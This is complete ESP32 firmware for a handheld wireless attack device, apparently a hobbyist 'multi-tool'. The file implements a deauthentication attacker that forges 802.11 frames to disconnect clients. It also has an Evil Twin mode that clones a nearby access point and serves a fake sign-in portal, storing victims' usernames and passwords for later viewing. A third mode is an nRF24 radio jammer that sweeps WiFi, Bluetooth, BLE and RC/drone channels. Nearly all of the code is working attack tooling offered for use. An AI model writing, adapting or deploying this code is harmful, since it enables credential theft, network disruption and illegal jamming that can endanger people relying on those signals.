// =============================================================
// ESP32 MULTI-TOOL v2.6
// =============================================================
// BUTTON (GPIO0 built-in BOOT):
//   Single click  = scroll down / next / ch+
//   Double click  = primary action
//   Triple click  = secondary action OR exit back to idle
//   Hold 700ms    = cycle ALL modes on screen, release to enter
//
// SWITCHES (only two working switches used):
//   D32 = Jammer shortcut
//   D33 = WiFi Deauther shortcut
//   Evil Twin, NRF Cap, NRF Replay → hold button to cycle and select
//
// BUTTON MAP PER MODE:
//   Deauth   : 1=next AP  2=fire on/off  3=rescan
//   EvilTwin : 1=next SSID  2=launch/stop  3=creds on OLED
//   Jammer   : 1=next target (or ch+ in CUSTOM)  2=start/stop
//              triple always exits to idle
//
// EVIL TWIN CREDS:
//   http://192.168.4.1/creds (user:admin pass:CREDS_PASSWORD)
//   OR triple click while live → OLED viewer
//
// JAMMER TARGETS:
//   WIFI      — sweeps nRF24 ch1-83  (2401-2483 MHz, all WiFi 2.4GHz)
//   BLUETOOTH — sweeps nRF24 ch2-80  (2402-2480 MHz, BT classic)
//   BLE       — rotates ch2/26/80    (BLE advertising channels)
//   RC/DRONE  — sweeps nRF24 ch0-125 (full 2.4GHz, hits most RC/ESB)
//   CUSTOM    — fixed manual channel, 1=ch+  2=start/stop
// =============================================================

#define CREDS_PASSWORD "changeme123"   // ← change before flashing

#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <RF24.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

// =============================================================
// PINS
// =============================================================
#define OLED_SDA   21
#define OLED_SCL   22
#define NRF_CE      5
#define NRF_CSN    17
#define LED_RED     2
#define LED_BLUE   25
#define LED_GREEN  26
#define LED_YELLOW 27
#define SW_JAMMER   32   // working — internal pullup → Jammer shortcut
#define SW_DEAUTH   33   // working — internal pullup → Deauther shortcut
// D34, D35, VP removed — input-only pins with no pullup, unreliable
#define BOOT_BTN    0

#define SCREEN_W 128
#define SCREEN_H  64

Adafruit_SSD1306 display(SCREEN_W, SCREEN_H, &Wire, -1);
RF24 radio(NRF_CE, NRF_CSN);

enum AppMode {
  MODE_IDLE = 0,
  MODE_DEAUTH,
  MODE_EVIL_TWIN,
  MODE_JAMMER
};
AppMode currentMode = MODE_IDLE;

// =============================================================
// BUTTON STATE MACHINE
// single / double / triple click + hold detection
// =============================================================
enum BtnSM { BS_IDLE, BS_PRESSED, BS_WAIT_MORE, BS_HOLDING };
BtnSM        btnState  = BS_IDLE;
int          btnClicks = 0;
unsigned long btnT     = 0;

bool evtSingle = false, evtDouble = false, evtTriple = false;
bool evtHoldStart = false, evtHoldEnd = false;
bool isHolding = false;

const unsigned long HOLD_THRESH  = 700;
const unsigned long CLICK_WINDOW = 400;

void updateBoot() {
  evtSingle = evtDouble = evtTriple = evtHoldStart = evtHoldEnd = false;
  bool p = (digitalRead(BOOT_BTN) == LOW);
  unsigned long now = millis();
  switch (btnState) {
    case BS_IDLE:
      if (p) { btnState = BS_PRESSED; btnT = now; }
      break;
    case BS_PRESSED:
      if (!p) { btnClicks++; btnState = BS_WAIT_MORE; btnT = now; }
      else if (now - btnT >= HOLD_THRESH) {
        btnClicks = 0; btnState = BS_HOLDING; isHolding = true; evtHoldStart = true;
      }
      break;
    case BS_WAIT_MORE:
      if (p) { btnState = BS_PRESSED; btnT = now; }
      else if (now - btnT >= CLICK_WINDOW) {
        if      (btnClicks == 1) evtSingle = true;
        else if (btnClicks == 2) evtDouble = true;
        else                     evtTriple = true;
        btnClicks = 0; btnState = BS_IDLE;
      }
      break;
    case BS_HOLDING:
      if (!p) { isHolding = false; evtHoldEnd = true; btnState = BS_IDLE; }
      break;
  }
}

// =============================================================
// MODE CYCLING (hold, no switches active)
// =============================================================
const char* cycleLabels[] = { "DEAUTHER","EVIL TWIN","JAMMER" };
AppMode     cycleModes[]  = { MODE_DEAUTH, MODE_EVIL_TWIN, MODE_JAMMER };
const int   NUM_CYCLE     = 3;
int         holdCycleIdx  = 0;
unsigned long holdCycleLast = 0;

AppMode getSwitchMode() {
  if (digitalRead(SW_JAMMER) == LOW) return MODE_JAMMER;
  if (digitalRead(SW_DEAUTH) == LOW) return MODE_DEAUTH;
  return MODE_IDLE;
}
bool switchActive() { return getSwitchMode() != MODE_IDLE; }

void drawHoldOverlay() {
  display.fillRect(12, 21, 104, 22, SSD1306_BLACK);
  display.drawRect(12, 21, 104, 22, SSD1306_WHITE);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(16, 27); display.setTextSize(1);
  display.printf("< %-9s >", cycleLabels[holdCycleIdx]);
  display.display();
}

// =============================================================
// OLED HELPERS
// =============================================================
void oledClear() { display.clearDisplay(); display.setTextSize(1); display.setTextColor(SSD1306_WHITE); }
void oledHeader(const char* t) {
  display.fillRect(0,0,SCREEN_W,11,SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK); display.setCursor(2,2); display.print(t);
  display.setTextColor(SSD1306_WHITE);
}
void oledFooter(const char* t) { display.setCursor(0,57); display.setTextSize(1); display.print(t); }
void ledsOff() { digitalWrite(LED_RED,LOW); digitalWrite(LED_BLUE,LOW); digitalWrite(LED_GREEN,LOW); digitalWrite(LED_YELLOW,LOW); }

// =============================================================
// IDLE — shows live switch states
// =============================================================
void drawIdle() {
  oledClear();
  display.setCursor(22,0); display.print("[ MULTI-TOOL ]");

  // Show the two working switches
  const char* lbl[] = { "JAMMER","DEAUTH" };
  const int   pins[]= { SW_JAMMER, SW_DEAUTH };
  for (int i = 0; i < 2; i++) {
    bool on = (digitalRead(pins[i]) == LOW);
    int col = i * 68;
    display.setCursor(col, 12); display.print(lbl[i]);
    if (on) {
      display.fillRect(col, 21, 55, 9, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(col+4, 22); display.print("[ ON  ]");
      display.setTextColor(SSD1306_WHITE);
    } else {
      display.setCursor(col, 22); display.print("[ off ]");
    }
  }

  display.drawLine(0, 33, 128, 33, SSD1306_WHITE);
  display.setCursor(0, 37); display.print("Hold btn: cycle modes");
  display.setCursor(0, 47); display.print("Release:  enter mode");
  display.setCursor(0, 57); display.print("Triple:   exit mode");
  display.display();
}

// =============================================================
// WIFI DEAUTHER — async scan
// 1=next AP  2=toggle fire  3=rescan
// =============================================================
struct APEntry { char ssid[33]; uint8_t bssid[6]; int32_t rssi; uint8_t channel; };
#define MAX_APS 20
APEntry apList[MAX_APS];
int  apCount=0, apSelected=0;
bool deauthing=false, wifiReady=false, wifiScanning=false;

uint8_t deauthFrame[26]={
  0xC0,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x07,0x00
};

void initWifi() {
  if (wifiReady) return;
  wifi_init_config_t cfg=WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA); esp_wifi_start();
  wifiReady=true;
}

void startWifiScanAsync() {
  WiFi.mode(WIFI_STA); WiFi.scanNetworks(true,true);
  wifiScanning=true; apCount=0;
}

void pollWifiScan() {
  if (!wifiScanning) return;
  int n=WiFi.scanComplete();
  if (n==WIFI_SCAN_RUNNING) return;
  if (n>0) {
    apCount=min(n,MAX_APS);
    for (int i=0;i<apCount;i++) {
      strlcpy(apList[i].ssid,WiFi.SSID(i).c_str(),33);
      apList[i].rssi=WiFi.RSSI(i); apList[i].channel=WiFi.channel(i);
      memcpy(apList[i].bssid,WiFi.BSSID(i),6);
    }
    WiFi.scanDelete();
  }
  esp_wifi_set_mode(WIFI_MODE_APSTA); wifiScanning=false;
}

void sendDeauth(int idx) {
  uint8_t* b=apList[idx].bssid;
  memcpy(&deauthFrame[10],b,6); memcpy(&deauthFrame[16],b,6);
  esp_wifi_set_channel(apList[idx].channel,WIFI_SECOND_CHAN_NONE);
  for (int i=0;i<10;i++) { esp_wifi_80211_tx(WIFI_IF_AP,deauthFrame,sizeof(deauthFrame),false); delayMicroseconds(200); }
}

void drawDeauth() {
  oledClear();
  oledHeader(deauthing?"DEAUTH [FIRING]":(wifiScanning?"DEAUTH [SCAN...]":"DEAUTH"));
  if (apCount==0) {
    display.setCursor(0,22); display.print(wifiScanning?"Scanning APs...":"No APs found.");
    display.setCursor(0,34); display.print("Triple click to rescan.");
  } else {
    for (int i=0;i<3&&i<apCount;i++) {
      int idx=(apSelected+i)%apCount;
      display.setCursor(0,13+i*16);
      display.printf("%s%.15s",i==0?">":" ",apList[idx].ssid);
      display.setCursor(6,13+i*16+8);
      display.printf("ch%d %ddBm %s",apList[idx].channel,apList[idx].rssi,idx==apSelected&&deauthing?"[FIRE]":"");
    }
    char nav[12]; snprintf(nav,12,"%d/%d",apSelected+1,apCount);
    display.setCursor(100,57); display.print(nav);
  }
  oledFooter("1:next 2:fire 3:scan");
  display.display();
}

void handleDeauth() {
  pollWifiScan();
  if (evtSingle&&apCount>0) { deauthing=false; digitalWrite(LED_RED,LOW); apSelected=(apSelected+1)%apCount; }
  if (evtDouble&&apCount>0) { deauthing=!deauthing; digitalWrite(LED_RED,deauthing); }
  if (evtTriple) { deauthing=false; digitalWrite(LED_RED,LOW); startWifiScanAsync(); }
  if (deauthing&&apCount>0) { sendDeauth(apSelected); digitalWrite(LED_RED,!digitalRead(LED_RED)); }
  drawDeauth();
}

// =============================================================
// EVIL TWIN
// 1=next SSID  2=launch/stop  3=creds viewer (when live)
// Clones SSID + BSSID + channel of target AP
// Creds: http://192.168.4.1/creds  OR triple click → OLED
// =============================================================
DNSServer  dnsServer;
WebServer  httpServer(80);
bool       twinActive=false;
int        credCount=0, twinScroll=0;
char       twinSSID[33]="Free_WiFi";
uint8_t    twinBSSID[6]={0xDE,0xAD,0xBE,0xEF,0x00,0x01};
uint8_t    twinChannel=6;
IPAddress  apIP(192,168,4,1);

bool twinCredsView=false;
#define MAX_CRED_LINES 15
char credLines[MAX_CRED_LINES][52];
int  credLineCount=0, credLineScroll=0;

void loadCredsOLED() {
  credLineCount=0; credLineScroll=0;
  File f=SPIFFS.open("/creds.txt",FILE_READ);
  if (!f) return;
  while (f.available()&&credLineCount<MAX_CRED_LINES) {
    String ln=f.readStringUntil('\n'); ln.trim();
    if (ln.length()>0) strlcpy(credLines[credLineCount++],ln.c_str(),51);
  }
  f.close();
}

const char* portalHTML=R"html(<!DOCTYPE html><html><head>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign In</title>
<style>body{font-family:sans-serif;max-width:380px;margin:50px auto;padding:20px}
input{width:100%;padding:10px;margin:6px 0;box-sizing:border-box;font-size:16px}
button{width:100%;padding:12px;background:#0066CC;color:#fff;border:none;font-size:16px}
</style></head><body>
<h2>Network Login</h2><p>Sign in to access the internet.</p>
<form method='POST' action='/login'>
<input name='u' placeholder='Email or Username' required>
<input name='p' type='password' placeholder='Password' required>
<button>Connect</button></form></body></html>)html";

void startTwin(const char* ssid, uint8_t* bssid, uint8_t channel) {
  initWifi();
  esp_wifi_stop();
  if (bssid) esp_wifi_set_mac(WIFI_IF_AP,bssid);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  WiFi.softAPConfig(apIP,apIP,IPAddress(255,255,255,0));
  WiFi.softAP(ssid,"",channel,0,4);
  dnsServer.start(53,"*",apIP);
  httpServer.on("/",HTTP_GET,[]{httpServer.send(200,"text/html",portalHTML);});
  httpServer.on("/login",HTTP_POST,[]{
    String u=httpServer.arg("u"),p=httpServer.arg("p");
    File f=SPIFFS.open("/creds.txt",FILE_APPEND);
    if (f){f.printf("[%lus] %s : %s\n",millis()/1000,u.c_str(),p.c_str());f.close();}
    credCount++; digitalWrite(LED_GREEN,HIGH);
    httpServer.sendHeader("Location","https://www.google.com"); httpServer.send(302);
  });
  httpServer.on("/creds",HTTP_GET,[]{
    if (!httpServer.authenticate("admin",CREDS_PASSWORD))
      return httpServer.requestAuthentication(BASIC_AUTH,"Multi-Tool","Denied.");
    File f=SPIFFS.open("/creds.txt",FILE_READ);
    if (!f||f.size()==0){httpServer.send(200,"text/plain","No creds yet.");return;}
    String out="<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
               "<style>body{font-family:monospace;padding:15px}pre{background:#111;color:#0f0;padding:12px;border-radius:6px}</style>"
               "</head><body><h3>Captured Credentials</h3><pre>";
    while(f.available()) out+=(char)f.read();
    f.close(); out+="</pre><a href='/creds/clear'>[Clear all]</a></body></html>";
    httpServer.send(200,"text/html",out);
  });
  httpServer.on("/creds/clear",HTTP_GET,[]{
    if (!httpServer.authenticate("admin",CREDS_PASSWORD))
      return httpServer.requestAuthentication(BASIC_AUTH,"Multi-Tool","Denied.");
    SPIFFS.remove("/creds.txt"); credCount=0;
    httpServer.send(200,"text/plain","Cleared.");
  });
  httpServer.onNotFound([]{httpServer.sendHeader("Location","http://"+apIP.toString());httpServer.send(302);});
  httpServer.begin();
  twinActive=true;
}

void stopTwin() { httpServer.stop(); dnsServer.stop(); WiFi.softAPdisconnect(true); twinActive=false; }

void drawEvilTwin() {
  oledClear();
  if (twinCredsView) {
    char hdr[22]; snprintf(hdr,22,"CREDS [%d]",credLineCount);
    oledHeader(hdr);
    if (credLineCount==0) {
      display.setCursor(0,25); display.print("No creds captured yet.");
      display.setCursor(0,37); display.print("Wait for victims.");
    } else {
      String ln=credLines[credLineScroll%credLineCount];
      int sep=ln.indexOf(" : ");
      int ts=ln.indexOf("] ");
      display.setCursor(0,14); display.print("USER:");
      display.setCursor(0,24);
      String user = (ts>=0&&sep>ts) ? ln.substring(ts+2,sep) : ln.substring(0,sep>0?sep:ln.length());
      display.print(user.length()>20 ? user.substring(0,20) : user);
      display.setCursor(0,37); display.print("PASS:");
      display.setCursor(0,47);
      String pass = sep>=0 ? ln.substring(sep+3) : "?";
      display.print(pass.length()>20 ? pass.substring(0,20) : pass);
      char nav[12]; snprintf(nav,12,"%d/%d",credLineScroll+1,credLineCount);
      display.setCursor(100,57); display.print(nav);
    }
    oledFooter("1:next  2:back");
  } else {
    oledHeader(twinActive?"EVIL TWIN [LIVE]":"EVIL TWIN");
    if (!twinActive) {
      display.setCursor(0,13); display.print("Clone target SSID:");
      display.setCursor(0,23);
      if (apCount>0) {
        int idx=twinScroll%apCount;
        display.printf("> %.16s",apList[idx].ssid);
        display.setCursor(0,33);
        display.printf("  ch%d  %02X:%02X:%02X...",
          apList[idx].channel,apList[idx].bssid[0],apList[idx].bssid[1],apList[idx].bssid[2]);
        char nav[12]; snprintf(nav,12,"%d/%d",(twinScroll%apCount)+1,apCount);
        display.setCursor(100,33); display.print(nav);
      } else { display.print("> Free_WiFi (no scan)"); }
      display.setCursor(0,46); display.print("1:next  2:launch");
    } else {
      display.setCursor(0,13); display.printf("SSID: %.18s",twinSSID);
      display.setCursor(0,24); display.printf("ch:%d  192.168.4.1",twinChannel);
      display.setCursor(0,35); display.printf("Creds: %d captured",credCount);
      display.setCursor(0,46); display.print("2:stop  3:view creds");
    }
  }
  display.display();
}

void handleEvilTwin() {
  if (twinCredsView) {
    if (evtSingle) credLineScroll=(credLineScroll+1)%max(credLineCount,1);
    if (evtDouble||evtTriple) twinCredsView=false;
  } else {
    if (!twinActive) {
      if (evtSingle&&apCount>0) twinScroll=(twinScroll+1)%apCount;
      if (evtDouble) {
        if (apCount>0) {
          int idx=twinScroll%apCount;
          strlcpy(twinSSID,apList[idx].ssid,33);
          memcpy(twinBSSID,apList[idx].bssid,6);
          twinChannel=apList[idx].channel;
          SPIFFS.begin(true); startTwin(twinSSID,twinBSSID,twinChannel);
        } else {
          SPIFFS.begin(true); startTwin(twinSSID,nullptr,twinChannel);
        }
      }
    } else {
      dnsServer.processNextRequest(); httpServer.handleClient();
      if (evtDouble) stopTwin();
      if (evtTriple) { loadCredsOLED(); twinCredsView=true; }
    }
  }
  drawEvilTwin();
}

// =============================================================
// nRF24 SETUP (shared, used by jammer)
// =============================================================
bool nrfReady = false;

void setupNRF() {
  if (!radio.begin()) return;
  radio.setPALevel(RF24_PA_MAX); radio.setDataRate(RF24_2MBPS);
  radio.setAutoAck(false); radio.disableCRC(); radio.setPayloadSize(32);
  nrfReady = true;
}

// =============================================================
// nRF24 JAMMER — target-based
// Selects a jam target then sweeps or fixes a carrier wave.
//
// Jammer OFF:  1=next target   2=start
// Jammer ON:   2=stop          1=ch+ (CUSTOM only)
// Triple always exits to idle.
//
// TARGETS:
//   WIFI      ch1-83   2401-2483 MHz  sweep 2ms/hop
//   BLUETOOTH ch2-80   2402-2480 MHz  sweep 1ms/hop
//   BLE       ch2/26/80 advert chans  rotates 1ms/hop
//   RC/DRONE  ch0-125  full 2.4GHz    sweep 2ms/hop
//   CUSTOM    fixed manual channel    1=ch+  2=jam
// =============================================================
struct JamTarget { const char* name; const char* desc; uint8_t lo; uint8_t hi; uint8_t hopMs; };
// lo==hi==0 means BLE special (3 fixed advertising channels)
// hopMs==0  means CUSTOM (fixed channel, no sweep)
const JamTarget JAM_TARGETS[] = {
  { "WIFI",      "ch1-83  2401-2483MHz",   1,  83, 2 },
  { "BLUETOOTH", "ch2-80  2402-2480MHz",   2,  80, 1 },
  { "BLE",       "advert ch 2/26/80",       0,   0, 1 },
  { "RC/DRONE",  "ch0-125 full 2.4GHz",    0, 125, 2 },
  { "CUSTOM",    "manual channel",          0,   0, 0 },
};
const int NUM_JAM_TARGETS = 5;
const uint8_t BLE_ADV_CHANS[3] = { 2, 26, 80 };

int           jamTargetIdx  = 0;
uint8_t       jamCustomChan = 40;
bool          jamActive     = false;
uint8_t       jamCurChan    = 0;
int           jamBleIdx     = 0;
unsigned long jamHopLast    = 0;

void jamStart() {
  if (!nrfReady) return;
  radio.stopListening();
  const JamTarget& t = JAM_TARGETS[jamTargetIdx];
  if (t.hopMs == 0) {
    jamCurChan = jamCustomChan;
  } else if (t.lo == 0 && t.hi == 0) {
    jamBleIdx = 0; jamCurChan = BLE_ADV_CHANS[0];
  } else {
    jamCurChan = t.lo;
  }
  radio.startConstCarrier(RF24_PA_MAX, jamCurChan);
  jamActive = true; jamHopLast = millis();
  digitalWrite(LED_RED, HIGH);
}

void jamStop() {
  if (!nrfReady) return;
  radio.stopConstCarrier();
  radio.begin();
  radio.setPALevel(RF24_PA_MAX); radio.setDataRate(RF24_2MBPS);
  radio.setAutoAck(false); radio.disableCRC(); radio.setPayloadSize(32);
  jamActive = false; ledsOff();
}

void jamPoll() {
  if (!jamActive) return;
  const JamTarget& t = JAM_TARGETS[jamTargetIdx];
  if (t.hopMs == 0) return;
  if (millis() - jamHopLast < t.hopMs) return;
  jamHopLast = millis();
  if (t.lo == 0 && t.hi == 0) {
    jamBleIdx = (jamBleIdx + 1) % 3;
    jamCurChan = BLE_ADV_CHANS[jamBleIdx];
  } else {
    jamCurChan = (jamCurChan >= t.hi) ? t.lo : jamCurChan + 1;
  }
  radio.stopConstCarrier();
  radio.startConstCarrier(RF24_PA_MAX, jamCurChan);
  if ((jamCurChan % 8) == 0) digitalWrite(LED_YELLOW, !digitalRead(LED_YELLOW));
}

void drawJammer() {
  oledClear();
  const JamTarget& t = JAM_TARGETS[jamTargetIdx];
  char hdr[22];
  if (jamActive) snprintf(hdr, 22, "JAM [%s]", t.name);
  else           snprintf(hdr, 22, "JAMMER");
  oledHeader(hdr);

  if (!jamActive) {
    display.setCursor(0, 13); display.printf("> %s", t.name);
    display.setCursor(0, 23);
    if (jamTargetIdx == 4) {
      display.printf("  Ch:%3d (%dMHz)", jamCustomChan, 2400 + jamCustomChan);
      display.setCursor(0, 33); display.print("  1:ch+  2:start jam");
    } else {
      display.print(t.desc);
      display.setCursor(0, 33);
      if (t.lo == 0 && t.hi == 0) display.printf("  rotates 3 advert ch");
      else display.printf("  %d channels, sweep", t.hi - t.lo + 1);
      display.setCursor(0, 43); display.print("  1:next  2:start jam");
    }
  } else {
    display.setCursor(0, 13); display.printf("Target: %s", t.name);
    display.setCursor(0, 23); display.printf("Chan: %3d  %dMHz", jamCurChan, 2400 + jamCurChan);
    if (jamTargetIdx == 4) {
      display.setCursor(0, 33); display.print("Fixed carrier [ON]");
      display.setCursor(0, 43); display.print("1:ch+  2:stop");
    } else {
      display.setCursor(0, 33); display.print("Sweeping [ACTIVE]");
      display.setCursor(0, 43); display.print("2:stop  3:exit");
    }
    digitalWrite(LED_RED, !digitalRead(LED_RED));
  }
  display.display();
}

void handleJammer() {
  if (!nrfReady) {
    oledClear(); oledHeader("JAMMER");
    display.setCursor(0, 25); display.print("nRF24 not found!");
    display.setCursor(0, 37); display.print("Check wiring.");
    display.display(); return;
  }
  if (!jamActive) {
    if (evtSingle) {
      if (jamTargetIdx == 4) {
        jamCustomChan = jamCustomChan >= 125 ? 0 : jamCustomChan + 1;
      } else {
        jamTargetIdx = (jamTargetIdx + 1) % NUM_JAM_TARGETS;
      }
    }
    if (evtDouble) jamStart();
  } else {
    if (evtDouble) jamStop();
    if (jamTargetIdx == 4 && evtSingle) {
      jamCustomChan = jamCustomChan >= 125 ? 0 : jamCustomChan + 1;
      jamCurChan = jamCustomChan;
      radio.stopConstCarrier();
      radio.startConstCarrier(RF24_PA_MAX, jamCurChan);
    }
  }
  jamPoll();
  drawJammer();
}

// =============================================================
// MODE TRANSITIONS
// =============================================================
void onModeEnter(AppMode mode) {
  ledsOff(); twinCredsView=false;
  if (jamActive) jamStop();
  switch (mode) {
    case MODE_IDLE:
      if (twinActive) stopTwin();
      deauthing=false; drawIdle(); break;
    case MODE_DEAUTH:    initWifi(); apSelected=0; deauthing=false; startWifiScanAsync(); break;
    case MODE_EVIL_TWIN: credCount=0; twinScroll=0; SPIFFS.begin(true); break;
    case MODE_JAMMER:    jamTargetIdx=0; jamCustomChan=40; jamActive=false; break;
  }
}

// =============================================================
// SETUP & LOOP
// =============================================================
void setup() {
  Serial.begin(115200);
  pinMode(LED_RED,OUTPUT); pinMode(LED_BLUE,OUTPUT);
  pinMode(LED_GREEN,OUTPUT); pinMode(LED_YELLOW,OUTPUT);
  pinMode(SW_JAMMER, INPUT_PULLUP);
  pinMode(SW_DEAUTH, INPUT_PULLUP);
  pinMode(BOOT_BTN,  INPUT_PULLUP);

  Wire.begin(OLED_SDA,OLED_SCL);
  if (!display.begin(SSD1306_SWITCHCAPVCC,0x3C)) { Serial.println("OLED fail"); while(1); }

  display.clearDisplay(); display.setTextSize(2); display.setTextColor(SSD1306_WHITE);
  display.setCursor(18,8);  display.print("MULTI");
  display.setCursor(14,28); display.print("-TOOL-");
  display.setTextSize(1);
  display.setCursor(20,50); display.print("v2.6  ESP32+nRF24");
  display.display();

  for (int i=0;i<3;i++) {
    for (int p:{LED_RED,LED_BLUE,LED_GREEN,LED_YELLOW}) { digitalWrite(p,HIGH); delay(70); digitalWrite(p,LOW); }
  }

  setupNRF(); SPIFFS.begin(true);
  delay(400); drawIdle();
}

void loop() {
  updateBoot();

  // Hold = cycle ALL modes — process BEFORE switch check so holdEnd enters mode correctly
  if (evtHoldStart) { holdCycleLast=millis(); drawHoldOverlay(); }
  if (isHolding && millis()-holdCycleLast>=1000) {
    holdCycleIdx=(holdCycleIdx+1)%NUM_CYCLE;
    holdCycleLast=millis(); drawHoldOverlay();
  }
  if (evtHoldEnd) {
    currentMode=cycleModes[holdCycleIdx]; onModeEnter(currentMode);
    return; // skip switch check this frame so we don't immediately reset to idle
  }

  // Switch-based mode (takes priority over button)
  AppMode sw=getSwitchMode();
  if (sw!=MODE_IDLE && sw!=currentMode) {
    currentMode=sw; onModeEnter(currentMode);
  } else if (sw==MODE_IDLE && currentMode!=MODE_IDLE && !switchActive() && !isHolding) {
    // Only reset to idle if the current mode was set by a switch (not by hold-cycle)
    // Check: if the switch that would have activated currentMode is no longer active
    bool modeFromSwitch = (currentMode==MODE_JAMMER || currentMode==MODE_DEAUTH);
    if (modeFromSwitch) { currentMode=MODE_IDLE; onModeEnter(MODE_IDLE); }
  }

  // Triple = exit to idle
  if (evtTriple && currentMode!=MODE_IDLE) {
    if (jamActive) jamStop();
    currentMode=MODE_IDLE; onModeEnter(MODE_IDLE);
    return;
  }

  switch (currentMode) {
    case MODE_IDLE:
      { static unsigned long li=0; if(millis()-li>500){drawIdle();li=millis();} break; }
    case MODE_DEAUTH:    handleDeauth();    break;
    case MODE_EVIL_TWIN: handleEvilTwin(); break;
    case MODE_JAMMER:    handleJammer();   break;
  }
}
